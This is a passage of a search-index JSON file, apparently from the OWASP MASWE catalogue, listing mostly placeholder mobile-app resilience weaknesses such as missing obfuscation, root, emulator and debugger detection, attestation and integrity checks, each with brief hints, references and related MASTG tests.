hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0008</p>","tags":["android","ios","L2","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0008/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app may not check for a secure device lock (e.g. device passcode) and may allow for unauthorized access to sensitive data. On iOS enforcing device lock security (i.e., ensuring a passcode is set) has an additional benefit which is that it is tightly coupled with data encryption, assuming the app leverages the correct data protection APIs.</p>","tags":["android","ios","L2","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0008/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>user set a device passcode via <code>isDeviceSecure()</code> on Android better than only ensuring that the secure screen lock is set via <code>KeyguardManager.isKeyguardSecure()</code></li> <li>before attempting to authenticate, test to make sure that you actually have the ability to do so by calling the <code>LAContext.canEvaluatePolicy(_:error:)</code> method on iOS</li> <li>to make sure that biometrics can be used, verify that the <code>kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly</code> or the <code>kSecAttrAccessibleWhenPasscodeSet</code> protection class is set when the <code>SecAccessControlCreateWithFlags</code> method is called</li> </ul>","tags":["android","ios","L2","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0008/#references","title":"References","text":"<ul> <li>https://developer.apple.com/documentation/localauthentication/logging_a_user_into_your_app_with_face_id_or_touch_id</li> <li>https://grep.app/search?q=isdevicesecure%28&amp;filter[repo][0]=threema-ch/threema-android</li> <li>https://developer.android.com/reference/android/hardware/biometrics/BiometricManager#canAuthenticate(int)</li> </ul>","tags":["android","ios","L2","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0008/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0012 - Testing the Device-Access-Security Policy (android)</li> <li>MASTG-TEST-0017 - Testing Confirm Credentials (android)</li> <li>MASTG-TEST-0064 - Testing Biometric Authentication (ios)</li> </ul>","tags":["android","ios","L2","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0008/#tests","title":"Tests","text":"<p> MASTG-TEST-0249: Runtime Use of Secure Screen Lock Detection APIs  MASTG-TEST-0247: References to APIs for Detecting Secure Screen Lock  MASTG-TEST-0248: References to APIs for Detecting Secure Screen Lock  MASTG-TEST-0246: Runtime Use of Secure Screen Lock Detection APIs </p>","tags":["android","ios","L2","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0089/","title":"MASWE-0089: Code Obfuscation Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0089</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0089/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app's code doesn\u2019t implement effective obfuscation techniques to protect against reverse engineering (CWE-693), e.g. polymorphic obfuscation, method-inlining, insertion of opaque predicates, instruction substitution, and instruction block chopping.</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0089/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>polymorphic obfuscation</li> <li>method-inlining</li> <li>insertion of opaque predicates</li> <li>instruction substitution</li> <li>instruction block chopping</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0089/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0051 - Testing Obfuscation (android)</li> <li>MASTG-TEST-0093 - Testing Obfuscation (ios)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0090/","title":"MASWE-0090: Resource Obfuscation Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0090</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0090/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. resource obfuscation, binary encryption/packing</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0090/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>data/resource obfuscated/encrypted</li> <li>binaries encrypted/packed</li> <li>obfuscation/encryption used without integrity validation (CWE-649)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0090/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0090 - Testing File Integrity Checks (ios)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0091/","title":"MASWE-0091: Anti-Deobfuscation Techniques Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0091</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0091/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app's code doesn\u2019t implement effective anti-deobfuscation techniques to protect against reverse engineering (CWE-693)</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0091/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>anti-deobfuscation techniques</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0091/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0092/","title":"MASWE-0092: Static Analysis Tools Not Prevented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0092</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0092/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>AKA static damage control. The app's code doesn\u2019t implement effective techniques to prevent static analysis tools from decompiling the app (CWE-693).</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0092/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>prevent decompilation</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0092/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0093/","title":"MASWE-0093: Debugging Symbols Not Removed","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0093</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0093/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app contains debugging symbols, which can be exploited by attackers to understand the app's behavior (CWE-497). The app's debugging symbols are considered sensitive information (CWE-540) and should not be present in production builds.</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0093/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>debugging symbols not removed</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0093/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0040 - Testing for Debugging Symbols (android)</li> <li>MASTG-TEST-0083 - Testing for Debugging Symbols (ios)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0093/#tests","title":"Tests","text":"<p> MASTG-TEST-0219: Testing for Debugging Symbols </p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0094/","title":"MASWE-0094: Non-Production Resources Not Removed","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0094</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0094/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app contains non-production resources that should not be present in production builds, such as non-production URLs, code flows, or verbose logging. These resources help adversaries understand the app's behavior and potentially exploit it (CWE-497) or may include sensitive information (CWE-540).</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0094/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>non-production URLs</li> <li>code flows</li> <li>verbose logging (e.g., using logging utilities)</li> <li>enabled testing utilities (e.g., StrictMode)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0094/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0041 - Testing for Debugging Code and Verbose Error Logging (android)</li> <li>MASTG-TEST-0084 - Testing for Debugging Code and Verbose Error Logging (ios)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0094/#tests","title":"Tests","text":"<p> MASTG-TEST-0264: Runtime Use of StrictMode APIs  MASTG-TEST-0263: Logging of StrictMode Violations  MASTG-TEST-0265: References to StrictMode APIs </p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0095/","title":"MASWE-0095: Code That Disables Security Controls Not Removed","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0095</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0095/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app contains leftover debugging logic or test code (CWE-489) that was not removed before release, which can disable critical protections like TLS certificate validation. It may also include hidden settings or functions that allow bypassing security controls (CWE-912), making the app vulnerable to manipulation.</p>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0095/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>backdoors</li> <li>hidden settings to e.g. disable TLS verification</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0095/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0041 - Testing for Debugging Code and Verbose Error Logging (android)</li> <li>MASTG-TEST-0084 - Testing for Debugging Code and Verbose Error Logging (ios)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-3","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0096/","title":"MASWE-0096: Data Sent Unencrypted Over Encrypted Connections","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0096</p>","tags":["android","ios","R","maswe","masvs-resilience-3","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0096/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Use payload/End-2-End Encryption. Even if the connection is encrypted (e.g. HTTPS), performing a MITM attack should not reveal any sensitive information (e.g. about the inner workings of the app and its operations. This is not necessarily related to privacy).</p>","tags":["android","ios","R","maswe","masvs-resilience-3","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0096/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","R","maswe","masvs-resilience-3","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0097/","title":"MASWE-0097: Root/Jailbreak Detection Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0097</p>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0097/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>no root/jailbreak detection implemented e.g. check for Cydia, SuperSU, Magisk, Xposed, etc. The app does not implement effective techniques to detect if the device is rooted or jailbroken (CWE-693).</p>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0097/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>detection in place</li> <li>Effectiveness Assessment (e.g. bypassing the detection)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0097/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0045 - Testing Root Detection (android)</li> <li>MASTG-TEST-0088 - Testing Jailbreak Detection (ios)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0097/#tests","title":"Tests","text":"<p> MASTG-TEST-0241: Runtime Use of Jailbreak Detection Techniques  MASTG-TEST-0240: Jailbreak Detection in Code </p>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0098/","title":"MASWE-0098: App Virtualization Environment Detection Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0098</p>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0098/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app's code doesn\u2019t implement effective techniques to detect if it is running in a virtualized environment (CWE-693), e.g. checking for known virtualization software or anomalies in the environment.</p>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0098/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>detection in place for \"cloned\" apps or virtualized environments</li> <li>Effectiveness Assessment (e.g. bypassing the detection)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0098/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0099/","title":"MASWE-0099: Emulator Detection Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0099</p>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0099/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app's code doesn\u2019t implement effective techniques to detect if it is running in an emulator (CWE-693), e.g. identifying features and limitations available for commonly used emulation solutions</p>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0099/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>detection in place</li> <li>Effectiveness Assessment (e.g. bypassing the detection)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0099/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0049 - Testing Emulator Detection (android)</li> <li>MASTG-TEST-0092 - Testing Emulator Detection (ios)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0100/","title":"MASWE-0100: Device Attestation Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0100</p>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0100/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app doesn't use App Attestation APIs, such as Google Play Integrity API, iOS DeviceCheck API,so the backend cannot ensure requests originate from a genuine app binary (CWE-693). This exposes the app to tampering, fraud, replay attacks, and unauthorized use of premium features.</p>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0100/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>detection in place</li> <li>Effectiveness Assessment (e.g. bypassing the detection)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0100/#references","title":"References","text":"<ul> <li>https://developer.android.com/google/play/integrity</li> <li>https://support.google.com/googleplay/android-developer/answer/11395166?hl=en</li> <li>https://www.youtube.com/watch?v=TyxL78e5Bag</li> <li>https://github.com/1nikolas/play-integrity-checker-app</li> <li>https://developer.apple.com/videos/play/wwdc2021/10244/</li> <li>https://developer.apple.com/documentation/devicecheck/preparing-to-use-the-app-attest-service</li> <li>https://github.com/iansampson/AppAttest</li> <li>https://github.com/firebase/firebase-ios-sdk/blob/v8.15.0/FirebaseAppCheck/Sources/AppAttestProvider/DCAppAttestService%2BFIRAppAttestService.h</li> <li>https://blog.restlesslabs.com/john/ios-app-attest</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0100/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","R","maswe","masvs-resilience-1","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0101/","title":"MASWE-0101: Debugger Detection Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0101</p>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0101/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app's code doesn\u2019t implement effective techniques to detect if it is being debugged (CWE-693), e.g. checking for debugger presence.</p>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0101/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>debugger detection</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0101/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0046 - Testing Anti-Debugging Detection (android)</li> <li>MASTG-TEST-0089 - Testing Anti-Debugging Detection (ios)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0102/","title":"MASWE-0102: Dynamic Analysis Tools Detection Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0102</p>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0102/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app's code doesn\u2019t implement effective techniques to detect if it is being analyzed by dynamic analysis tools (CWE-693), e.g. Frida, Xposed, Ellekit, etc.</p>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0102/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Frida detection</li> <li>Xposed detection</li> <li>ElleKit detection</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0102/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0048 - Testing Reverse Engineering Tools Detection (android)</li> <li>MASTG-TEST-0091 - Testing Reverse Engineering Tools Detection (ios)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0103/","title":"MASWE-0103: RASP Techniques Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0103</p>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0103/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app's code doesn\u2019t implement effective RASP techniques to detect if it is running in a compromised environment (CWE-693), e.g. Runtime Application Self-Protection, detection triggering different responses.</p>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0103/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>detection triggering different responses</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0103/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","R","maswe","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0104/","title":"MASWE-0104: App Integrity Not Verified","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0104</p>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0104/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app's code doesn\u2019t implement effective techniques to verify the integrity of its own code (CWE-347), potentially relevant for apps in alternative app stores (not Google PlayStore or Apple AppStore). Also, e.g. Android V1 signing scheme only or iOS CodeDirectory v less than 20400. Also, e.g. App Signature or Binaries, native libraries including e.g. AppAttest.</p> <p>Note: consider Static Code Modification? / Repackaging Detection Not Implemented</p>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0104/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>App Signature or Binaries check on runtime</li> <li>native libraries including e.g. AppAttest</li> <li>Invalid App Signing Certificate</li> <li>Latest Available Signing Scheme Not Used - Android V1 signing scheme only</li> <li>Latest Available Signing Scheme Not Used - iOS CodeDirectory v less than 20400</li> <li>detection in place</li> <li>Effectiveness Assessment (e.g. bypassing the detection)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0104/#references","title":"References","text":"<ul> <li>https://developer.apple.com/documentation/xcode/using-the-latest-code-signature-format</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0104/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0038 - Making Sure that the App is Properly Signed (android)</li> <li>MASTG-TEST-0081 - Making Sure that the App Is Properly Signed (ios)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0104/#tests","title":"Tests","text":"<p> MASTG-TEST-0224: Usage of Insecure Signature Version  MASTG-TEST-0225: Usage of Insecure Signature Key Size  MASTG-TEST-0220: Usage of Outdated Code Signature Format </p>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0105/","title":"MASWE-0105: Integrity of App Resources Not Verified","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0105</p>","tags":["android","ios","R","maswe","masvs-resilience-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0105/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app's code doesn\u2019t implement effective techniques to verify the integrity of its own resources (CWE-693).</p>","tags":["android","ios","R","maswe","masvs-resilience-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0105/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Sandbox Integrity</li> <li>Integrity of downloaded resources</li> <li>Integrity of dynamically loaded resources (e.g. via backup restore)</li> 